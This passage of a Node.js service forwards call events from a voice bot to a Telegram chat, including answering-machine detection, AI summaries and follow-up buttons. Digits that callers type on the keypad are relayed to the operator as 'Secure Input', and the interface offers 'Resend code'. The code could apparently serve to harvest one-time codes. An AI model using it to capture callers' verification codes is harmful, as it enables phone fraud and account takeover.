        } else if (scenario !== 'general') {
          lines.push('');
          lines.push('Collected Inputs: None recorded.');
        }
        if (transcriptPreview) {
          lines.push('');
          lines.push(`Transcript: "${transcriptPreview}"`);
        }
        if (aiSummary) {
          lines.push('');
          lines.push(`AI Summary: ${aiSummary}`);
        }
      }

      const followUpKeyboard = this.buildOutcomeFollowUpKeyboard(call_sid, {
        allowCallAgain: !failureStates.includes(outcome),
      });
      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines), 'HTML', followUpKeyboard);

      const statusForUpdate = call.status || call.twilio_status || 'completed';
      await this.db.updateCallStatus(call_sid, statusForUpdate, {
        outcome_notified_at: new Date().toISOString(),
      });

      return true;
    } catch (error) {
      console.error('❌ Failed to send call outcome summary:', error);
      return false;
    }
  }

  async sendCallAmdUpdate(call_sid, telegram_chat_id) {
    try {
      const call = await this.db.getCall(call_sid);
      let answeredSignal = call?.amd_status || call?.answered_by;
      if (!answeredSignal && (call?.was_answered || (call?.duration && call.duration > 0) || call?.has_input)) {
        answeredSignal = 'human';
      }
      if (!answeredSignal) {
        return true;
      }

      const chatId = telegram_chat_id || call?.telegram_chat_id;
      if (!chatId) {
        return true;
      }

      const label = formatAnsweredLabel(answeredSignal);
      const confidencePercent = Number(call.amd_confidence) * 100;
      const amdDetail =
        label === 'human'
          ? 'Caller is live. Keep the conversation flowing like a human agent.'
          : label === 'machine'
            ? 'Likely voicemail or IVR detected. Pivot to a voicemail script or hang up.'
            : 'Monitoring audio channel for a final answer signal.';

      await this.updateCallThread(call_sid, chatId, {
        amd: {
          label: titleCase(label),
          emoji: label === 'human' ? '👂' : label === 'machine' ? '🤖' : '📡',
          confidence: Number.isFinite(confidencePercent) ? `${confidencePercent.toFixed(1)}%` : null,
          detail: amdDetail
        }
      }, call);
      return true;
    } catch (error) {
      console.error('❌ Failed to send AMD update notification:', error);
      return false;
    }
  }

  async sendCallHint(call_sid, telegram_chat_id, hintType) {
    try {
      const call = await this.db.getCall(call_sid);
      const maskedNumber = maskPhoneNumber(call?.phone_number);

      const hintDefinitions = {
        call_hint_caller_listening: {
          emoji: '👂',
          title: 'Caller is listening',
          detail: 'Human detected. Share live instructions or pause the bot if needed.',
        },
        call_hint_machine_detected: {
          emoji: '🤖',
          title: 'Machine detected',
          detail: 'AMD indicates a machine. Consider switching to voicemail or ending the call early.',
        },
        call_hint_input_detected: {
          emoji: '🔢',
          title: 'Digits detected',
          detail: 'Caller started entering digits. Watch the keypad capture stream.',
        },
      };

      const definition = hintDefinitions[hintType];
      if (!definition) {
        console.warn(`Unknown call hint type requested: ${hintType}`);
        return true;
      }

      const lines = [];
      lines.push(`${definition.emoji} ${definition.title}`);
      lines.push(definition.detail);
      lines.push('');
      lines.push(`Call: ${maskedNumber}`);

      if (hintType === 'call_hint_input_detected') {
        const preview = call?.latest_input_preview;
        const hint = preview ? `Latest digits: ${preview}` : 'Waiting for keypad summary.';
        lines.push(hint);
      }

      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
      return true;
    } catch (error) {
      console.error('❌ Failed to send call hint notification:', error);
      return false;
    }
  }

  async sendDualChannelAlert(call_sid, telegram_chat_id) {
    try {
      const [latestState, callDetails] = await Promise.all([
        this.db.getLatestCallState(call_sid, 'dtmf_verified'),
        this.db.getCall(call_sid),
      ]);

      if (!latestState || !callDetails) {
        return true;
      }

      const metadata = parseCallMetadata(callDetails.metadata_json) || {};
      const customerName = getCustomerName(callDetails, metadata);
      const stateData = parseStateData(latestState.data);
      const dualChannelRaw = stateData.dual_channel;
      const dualChannel =
        typeof dualChannelRaw === 'string'
          ? (() => {
              try {
                return JSON.parse(dualChannelRaw);
              } catch (error) {
                return null;
              }
            })()
          : dualChannelRaw;

      if (!dualChannel || !dualChannel.issue) {
        return true;
      }

      const issue = dualChannel.issue;
      const stageKey = stateData.stage_key || stateData.stageKey;
      const stageLabel =
        getStageLabelFromMetadata(metadata, stageKey) ||
        (stageKey ? stageKey.replace(/_/g, ' ') : 'Verification');

      let message = `*${escapeMarkdownV2('🚨 Dual-Channel Verification Alert')}*\n`;
      message += `*Client:* ${escapeMarkdownV2(customerName)}\n`;
      message += `*Stage:* ${escapeMarkdownV2(stageLabel)}\n`;

      if (issue.status === 'mismatch') {
        const checkLabel = issue.label || 'Secondary reference';
        message += `*Check:* ${escapeMarkdownV2(checkLabel)}\n`;
        if (issue.reference) {
          message += `*Reference:* ${escapeMarkdownV2(issue.reference)}\n`;
        }
        if (issue.observed) {
          message += `*Observed:* ${escapeMarkdownV2(issue.observed)}\n`;
        }
        message += `_${escapeMarkdownV2('Action: escalate to a human agent or re-verify before continuing.')}_\n`;
      } else {
        message += `_${escapeMarkdownV2(`Reference missing for ${issue.label || issue.type || 'secondary check'}. Please refresh CRM data.`)}_\n`;
      }

      await this.sendTelegramMessage(
        telegram_chat_id,
        message.trim(),
        'MarkdownV2',
        this.buildCallFollowUpKeyboard(call_sid, 'alert', {
          allowTranscript: true,
          callAgainPrompt: true,
        })
      );

      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_dual_channel_alert', true);
      }
      return true;
    } catch (error) {
      console.error('❌ Failed to send dual-channel alert:', error);
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_dual_channel_alert', false);
      }
      return false;
    }
  }

  // Process individual notification with enhanced error handling
  async sendNotification(notification) {
    const { id, call_sid, notification_type, telegram_chat_id, phone_number } = notification;

    try {
      let success = false;

      switch (notification_type) {
        case 'call_initiated':
        case 'call_queued':
          success = await this.sendCallStatusUpdate(call_sid, 'initiated', telegram_chat_id);
          break;
        case 'call_ringing':
          success = await this.sendCallStatusUpdate(call_sid, 'ringing', telegram_chat_id);
          break;
        case 'call_answered':
        case 'call_in_progress':
          success = await this.sendCallStatusUpdate(call_sid, 'answered', telegram_chat_id);
          break;
        case 'call_completed': {
          const [callDetails, dtmfEntries] = await Promise.all([
            this.db.getCall(call_sid),
            this.db.getCallDtmfEntries(call_sid),
          ]);
          success = await this.sendCallStatusUpdate(call_sid, 'completed', telegram_chat_id, { 
            duration: callDetails?.duration,
            sensitive_dtmf: isSensitiveDtmf(dtmfEntries),
          });
          break;
        }
        case 'call_input_dtmf':
        case 'call_dtmf_captured':
          success = await this.sendCallInputNotification(call_sid, telegram_chat_id);
          break;
        case 'call_amd_update':
          success = await this.sendCallAmdUpdate(call_sid, telegram_chat_id);
          break;
        case 'call_outcome_summary':
          success = await this.sendCallOutcomeSummary(call_sid, telegram_chat_id);
          break;
        case 'call_failed':
          const failedCall = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'failed', telegram_chat_id, { 
            error_message: failedCall?.error_message 
          });
          break;
        case 'call_busy':
          success = await this.sendCallStatusUpdate(call_sid, 'busy', telegram_chat_id);
          break;
        case 'call_no_answer':
        case 'call_no-answer':
          const noAnswerCall = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'no-answer', telegram_chat_id, {
            ring_duration: noAnswerCall?.ring_duration
          });
          break;
        case 'call_canceled':
          success = await this.sendCallStatusUpdate(call_sid, 'canceled', telegram_chat_id);
          break;
        case 'call_step_complete':
        case 'call_step_retry':
          success = await this.sendCallStepNotification(call_sid, telegram_chat_id, {
            isRetry: notification_type === 'call_step_retry'
          });
          break;
        case 'call_workflow_complete':
          success = await this.sendCallWorkflowComplete(call_sid, telegram_chat_id);
          break;
        case 'call_hint_caller_listening':
        case 'call_hint_machine_detected':
        case 'call_hint_input_detected':
          success = await this.sendCallHint(call_sid, telegram_chat_id, notification_type);
          break;
        case 'call_dual_channel_alert':
          success = await this.sendDualChannelAlert(call_sid, telegram_chat_id);
          break;
        default:
          console.warn(`⚠️ Unknown notification type: ${notification_type}`.yellow);
          success = await this.sendCallStatusUpdate(call_sid, notification_type.replace('call_', ''), telegram_chat_id);
      }

      if (success) {
        await this.db.updateEnhancedWebhookNotification(id, 'sent', null, null);
        console.log(`✅ Processed enhanced notification ${id} (${notification_type})`.green);
      } else {
        throw new Error('Failed to send notification');
      }

    } catch (error) {
      console.error(`❌ Failed to send notification ${id}:`, error.message);
      await this.db.updateEnhancedWebhookNotification(id, 'failed', error.message, null);
      
      // For critical failures, try to send error notification to user
      if (['call_failed'].includes(notification_type)) {
        try {
          await this.sendTelegramMessage(telegram_chat_id, `❌ Error processing ${notification_type.replace('_', ' ')}`);
        } catch (errorNotificationError) {
          console.error('Failed to send error notification:', errorNotificationError);
        }
      }
    }
  }

  // Enhanced Telegram message sending with markdown support
  async sendTelegramMessage(chatId, message, parseMode = 'HTML', replyMarkup = null) {
    const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
    const useMarkdown = parseMode === 'MarkdownV2';
    const sanitizedText = useMarkdown ? message : sanitizeTelegramText(message);
    const payload = {
      chat_id: chatId,
      text: sanitizedText,
      disable_web_page_preview: true
    };

    let resolvedParseMode = null;
    if (parseMode === false || parseMode === null) {
      resolvedParseMode = null;
    } else if (parseMode === true) {
      resolvedParseMode = 'Markdown';
    } else if (typeof parseMode === 'string' && parseMode.trim().length > 0) {
      resolvedParseMode = parseMode;
    } else {
      resolvedParseMode = 'HTML';
    }

    if (resolvedParseMode) {
      payload.parse_mode = resolvedParseMode;
    }

    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await axios.post(url, payload, {
      timeout: 15000, // Longer timeout for better reliability
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (!response.data.ok) {
      throw new Error(`Telegram API error: ${response.data.description || 'Unknown error'}`);
    }

    return response.data;
  }

  async editTelegramMessage(chatId, messageId, message, parseMode = 'MarkdownV2', replyMarkup = null) {
    const url = `https://api.telegram.org/bot${this.telegramBotToken}/editMessageText`;
    const useMarkdown = parseMode === 'MarkdownV2';
    const sanitizedText = useMarkdown ? message : sanitizeTelegramText(message);
    const payload = {
      chat_id: chatId,
      message_id: messageId,
      text: sanitizedText,
    };

    if (parseMode) {
      payload.parse_mode = parseMode;
    }

    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await axios.post(url, payload, {
      timeout: 15000,
      headers: { 'Content-Type': 'application/json' }
    });

    if (!response.data.ok) {
      throw new Error(`Telegram edit error: ${response.data.description || 'Unknown error'}`);
    }

    return response.data;
  }

  // Debug method for troubleshooting
  async sendDebugInfo(call_sid, telegram_chat_id, webhookData) {
    try {
      const debugMessage = buildTelegramMessage([
        `🔍 Debug Info for Call ${call_sid.slice(-6)}`,
        '',
        `Status: ${webhookData.CallStatus}`,
        `Duration: ${webhookData.Duration || 'N/A'}`,
        `AnsweredBy: ${webhookData.AnsweredBy || 'N/A'}`,
        `CallDuration: ${webhookData.CallDuration || 'N/A'}`,
        `DialDuration: ${webhookData.DialCallDuration || 'N/A'}`,
        `Error: ${webhookData.ErrorCode || 'None'}`,
        `From: ${webhookData.From || 'N/A'}`,
        `To: ${webhookData.To || 'N/A'}`
      ]);

        await this.sendTelegramMessage(telegram_chat_id, debugMessage);
      return true;
    } catch (error) {
      console.error('Failed to send debug info:', error);
      return false;
    }
  }

  // Utility methods
  getStatusEmoji(status) {
    const statusEmojis = {
      'completed': '✅',
      'failed': '❌',
      'busy': '📵',
      'no-answer': '❌',
      'canceled': '🚫',
      'answered': '📞',
      'ringing': '🔔',
      'initiated': '📞'
    };
    return statusEmojis[status] || '📱';
  }

  buildCallFollowUpKeyboard(callSid, status, options = {}) {
    if (!callSid) return null;

    const sid = String(callSid);
    const base = `FOLLOWUP_CALL:${sid}:`;

    const allowTranscriptButton = options.allowTranscript !== false;
    const showCallAgainPrompt = Boolean(options.callAgainPrompt);
    const allowResend = Boolean(options.allowResend);

    const rows = [];
    rows.push([
      { text: '📝 Send recap', callback_data: `${base}recap` },
      { text: '⏰ Schedule follow-up', callback_data: `${base}schedule` }
    ]);

    const secondRow = [];
    if (allowTranscriptButton && (status === 'completed' || status === 'answered')) {
      secondRow.push({ text: '📋 View transcript', callback_data: `${base}transcript` });
    }
    secondRow.push({ text: '👤 Reassign to agent', callback_data: `${base}reassign` });
    rows.push(secondRow);

    if (showCallAgainPrompt) {
      const followRow = [{ text: '☎️ Call again', callback_data: `${base}callagain` }];
      if (allowResend) {
        followRow.push({ text: '📨 Resend code', callback_data: `${base}resend` });
      }
      followRow.push({ text: '⏭️ Skip', callback_data: `${base}skip` });
      rows.push(followRow);
    }

    return {
      inline_keyboard: rows
    };
  }

  buildOutcomeFollowUpKeyboard(callSid, options = {}) {
    if (!callSid) return null;
    const sid = String(callSid);
    const base = `FOLLOWUP_CALL:${sid}:`;
    const rows = [
      [
        { text: '📋 View Transcript', callback_data: `${base}transcript` },
        { text: '📝 View Summary', callback_data: `${base}recap` },
      ],
    ];
    const actionRow = [];
    if (options.allowCallAgain !== false) {
      actionRow.push({ text: '📞 Make Another Call', callback_data: `${base}callagain` });
    }
    if (options.allowSettings !== false) {
      actionRow.push({ text: '⚙️ Call Settings', callback_data: 'MENU' });
    }
    if (actionRow.length) {
      rows.push(actionRow);
    }
    return { inline_keyboard: rows };
  }

  splitMessage(message, maxLength) {
    const chunks = [];
    let currentChunk = '';
    const lines = message.split('\n');
    
    for (const line of lines) {
      if ((currentChunk + line + '\n').length > maxLength) {
        if (currentChunk) {
          chunks.push(currentChunk.trim());
          currentChunk = '';
        }
        
        // If a single line is too long, split it
        if (line.length > maxLength) {
          let remainingLine = line;
          while (remainingLine.length > maxLength) {
            let splitIndex = remainingLine.lastIndexOf(' ', maxLength);
            if (splitIndex === -1) splitIndex = maxLength;
            
            chunks.push(remainingLine.substring(0, splitIndex));
            remainingLine = remainingLine.substring(splitIndex).trim();
          }
          if (remainingLine) {
            currentChunk = remainingLine + '\n';
          }
        } else {
          currentChunk = line + '\n';
        }
      } else {
        currentChunk += line + '\n';
      }
    }
    
    if (currentChunk.trim()) {
      chunks.push(currentChunk.trim());
    }
    
    return chunks;
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Clean up old call data to prevent memory leaks
  cleanupOldCallData() {
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    const callsToCleanup = [];

    for (const [callSid, statusInfo] of this.activeCallStatus.entries()) {
      if (statusInfo.timestamp < oneHourAgo) {
        callsToCleanup.push(callSid);
      }
    }

    for (const callSid of callsToCleanup) {
      this.cleanupCallData(callSid);
    }

    if (callsToCleanup.length > 0) {
      console.log(`🧹 Cleaned up ${callsToCleanup.length} old call records`.gray);
    }
  }

  cleanupCallData(callSid) {
    this.activeCallStatus.delete(callSid);
    this.callTimestamps.delete(callSid);
    this.callThreads.delete(callSid);
  }

  getOrCreateThread(callSid, chatId) {
    let thread = this.callThreads.get(callSid);
    if (!thread) {
      thread = {
        chatId,
        messageId: null,
        context: {
          callSid,
          customer: { name: 'Client', phone: null },
          persona: 'Adaptive Agent',
          intent: 'General',
          sentiment: { label: 'neutral', emoji: '😐' },
          status: { emoji: '📞', label: 'Call Update', detail: 'Stand by…' },
          provider: 'UNKNOWN'
        }
      };
      this.callThreads.set(callSid, thread);
    } else if (chatId && thread.chatId !== chatId) {
      thread.chatId = chatId;
    }
    return thread;
  }

  buildThreadActionKeyboard(callSid, options = {}) {
    if (!callSid) return null;
    const base = `FOLLOWUP_CALL:${callSid}:`;
    const rows = [
      [
        { text: '☎️ Call Back', callback_data: `${base}callagain` },
        { text: '💬 SMS Recap', callback_data: `${base}recap` }
      ],
      [
        { text: '📋 View Transcript', callback_data: `${base}transcript` },
        { text: '⏰ Schedule Follow-Up', callback_data: `${base}schedule` }
      ]
    ];

    if (options.allowResend) {
      rows.push([{ text: '🔁 Resend Code', callback_data: `${base}resend` }]);
    }

    return { inline_keyboard: rows };
  }

  composeThreadMessage(context = {}) {
    const lines = [];
    const statusLine = `${context.status?.emoji || '📞'} ${context.status?.label || 'Call Update'}`;
    lines.push(`*${escapeMarkdownV2(statusLine)}*`);

    const phoneDisplay = context.customer?.phone ? maskPhoneNumber(context.customer.phone) : 'Unknown';
    lines.push(`*Client:* ${escapeMarkdownV2(context.customer?.name || 'Client')} (${escapeMarkdownV2(phoneDisplay)})`);
    lines.push(`*Persona:* ${escapeMarkdownV2(context.persona || 'Adaptive Agent')}`);
    lines.push(`*Intent:* ${escapeMarkdownV2(context.intent || 'General')}`);
    const sentimentText = `${context.sentiment?.emoji || '😐'} ${context.sentiment?.label || 'neutral'}`;
    lines.push(`*Sentiment:* ${escapeMarkdownV2(sentimentText)}`);

    if (context.status?.detail) {
      lines.push(`*Status Detail:* ${escapeMarkdownV2(context.status.detail)}`);
    }

    if (context.amd) {
      const amdLine = `${context.amd.emoji || '👂'} ${context.amd.label || 'Answer Update'}`;
      lines.push(`*Answer Detection:* ${escapeMarkdownV2(amdLine)}`);
      if (context.amd.detail) {
        lines.push(`_${escapeMarkdownV2(context.amd.detail)}_`);
      }
    }

    if (context.secureInput) {
      lines.push(`\n*Secure Input:* ${escapeMarkdownV2(context.secureInput.stageLabel || 'Verification')}`);
      if (context.secureInput.value) {
        lines.push(`Digits: ${escapeMarkdownV2(context.secureInput.value)}`);
      }
      if (context.secureInput.needsRetry) {
        lines.push('_Retry requested — agent attention needed._');
      }
      if (context.secureInput.clarification) {
        lines.push(`_${escapeMarkdownV2(context.secureInput.clarification)}_`);
      }
      if (context.secureInput.dualIssue) {
        lines.push(`⚠️ ${escapeMarkdownV2(context.secureInput.dualIssue)}`);
      }
      if (context.secureInput.nextStage) {
        lines.push(`Next: ${escapeMarkdownV2(context.secureInput.nextStage)}`);
      }
    }

    if (context.summary) {
      lines.push(`\n*Summary*\n${escapeMarkdownV2(context.summary)}`);
    }

    lines.push(`\n*Provider:* ${escapeMarkdownV2((context.provider || 'UNKNOWN').toUpperCase())}`);
    lines.push(`*Call ID:* ${escapeMarkdownV2(context.callSid || 'N/A')}`);

    if (context.lastUpdated) {
      lines.push(`_Last updated: ${escapeMarkdownV2(formatLocalTimestamp(context.lastUpdated))}_`);
    }

    return lines.join('\n');
  }

  async updateCallThread(callSid, chatId, updates = {}, callDetails = null) {
    if (!chatId) {
      console.warn(`Skipping thread update for ${callSid}; missing chat id.`);
      return false;
    }
    const thread = this.getOrCreateThread(callSid, chatId);
    const ctx = thread.context;
    ctx.callSid = ctx.callSid || callSid;
    ctx.lastUpdated = new Date().toISOString();

    if (callDetails) {
      ctx.provider = callDetails.provider || ctx.provider;
      ctx.customer = ctx.customer || {};
      ctx.customer.phone = callDetails.phone_number || ctx.customer.phone;
    }

    if (updates.customer) {
      ctx.customer = { ...(ctx.customer || {}), ...updates.customer };
    }
    if (updates.persona) {
      ctx.persona = updates.persona;
    }
    if (updates.intent) {
      ctx.intent = updates.intent;
    }
    if (updates.sentiment) {
      ctx.sentiment = updates.sentiment;
    }
    if (updates.status) {
      ctx.status = { ...(ctx.status || {}), ...updates.status };
    }
    if (updates.secureInput) {
      ctx.secureInput = { ...(ctx.secureInput || {}), ...updates.secureInput };
    }
    if (updates.summary !== undefined) {
      ctx.summary = updates.summary;
    }
    if (updates.amd) {
      ctx.amd = { ...(ctx.amd || {}), ...updates.amd };
    }
    if (updates.provider) {
      ctx.provider = updates.provider;
    }

    const keyboard = this.buildThreadActionKeyboard(callSid, {
      allowResend: ctx.secureInput?.allowResend
    });
    const text = this.composeThreadMessage(ctx);
    const messageId = await this.upsertThreadMessage(callSid, thread.chatId, text, keyboard);
    thread.messageId = messageId;
    return true;
  }

  async upsertThreadMessage(callSid, chatId, message, replyMarkup = null) {
    const thread = this.callThreads.get(callSid);
    const parseMode = 'MarkdownV2';
    try {
      if (thread?.messageId) {
        await this.editTelegramMessage(chatId, thread.messageId, message, parseMode, replyMarkup);
        return thread.messageId;
      }
      const sent = await this.sendTelegramMessage(chatId, message, parseMode, replyMarkup);
      const messageId = sent?.result?.message_id || sent?.message_id;
      if (thread) {
        thread.messageId = messageId;
      }
      return messageId;
    } catch (error) {
      if (thread?.messageId) {
        console.warn(`Failed to edit thread message for ${callSid}, retrying with new message:`, error.message);
        thread.messageId = null;
        return this.upsertThreadMessage(callSid, chatId, message, replyMarkup);
      }
      throw error;
    }
  }

  // Enhanced immediate status update with better error handling
  async sendImmediateStatus(call_sid, status, telegram_chat_id) {
    try {
      return await this.sendCallStatusUpdate(call_sid, status, telegram_chat_id);
    } catch (error) {
      console.error(`❌ Failed to send immediate status for ${call_sid}:`, error);
      // Try to send a generic notification
      try {
        await this.sendTelegramMessage(telegram_chat_id, `📱 Call ${call_sid.slice(-6)} status: ${status}`);
        return true;
      } catch (fallbackError) {
        console.error(`❌ Fallback notification also failed:`, fallbackError);
        return false;
      }
    }
  }

  // Enhanced health check
  async healthCheck() {
    if (!this.telegramBotToken) {
      return { status: 'disabled', reason: 'No Telegram bot token configured' };
    }

    try {
      const url = `https://api.telegram.org/bot${this.telegramBotToken}/getMe`;
      const response = await axios.get(url, { timeout: 8000 });
      
      if (response.data.ok) {
        return {
          status: 'healthy',
          bot_info: {
            username: response.data.result.username,
            first_name: response.data.result.first_name,
            id: response.data.result.id
          },
          is_running: this.isRunning,
          active_calls: this.activeCallStatus.size,
          tracked_calls: this.callTimestamps.size,
          process_interval: this.processInterval,
          enhanced_features: true
        };
      } else {
        return { status: 'error', reason: 'Telegram API returned error' };
      }
    } catch (error) {
      return { 
        status: 'error', 
        reason: error.message,
        code: error.code || 'UNKNOWN_ERROR'
      };
    }
  }

  // Get call status statistics
  getCallStatusStats() {
    const stats = {
      total_tracked_calls: this.activeCallStatus.size,
      status_breakdown: {},
      average_call_age_minutes: 0,
      enhanced_tracking: true
    };

    let totalAge = 0;
    for (const [callSid, statusInfo] of this.activeCallStatus.entries()) {
      const status = statusInfo.lastStatus;
      stats.status_breakdown[status] = (stats.status_breakdown[status] || 0) + 1;
      
      const ageMinutes = (new Date() - statusInfo.timestamp) / (1000 * 60);
      totalAge += ageMinutes;
    }

    if (this.activeCallStatus.size > 0) {
      stats.average_call_age_minutes = (totalAge / this.activeCallStatus.size).toFixed(1);
    }

    return stats;
  }

  // Method for testing notifications
  async testNotification(call_sid, status, telegram_chat_id) {
    console.log(`🧪 Testing notification: ${status} for call ${call_sid}`.blue);
    
    try {
      const success = await this.sendCallStatusUpdate(call_sid, status, telegram_chat_id);
      console.log(`🧪 Test result: ${success ? 'SUCCESS' : 'FAILED'}`.cyan);
      return success;
    } catch (error) {
      console.error(`🧪 Test failed:`, error);
      return false;
    }
  }

  // Get notification performance metrics
  getNotificationMetrics() {
    return {
      service_uptime: this.isRunning,
      process_interval_ms: this.processInterval,
      active_call_tracking: this.activeCallStatus.size,
      call_timestamps_tracked: this.callTimestamps.size,
      telegram_bot_configured: !!this.telegramBotToken,
      enhanced_features_enabled: true
    };
  }
}

// Export singleton instance
const enhancedWebhookService = new EnhancedWebhookService();
module.exports = { webhookService: enhancedWebhookService };
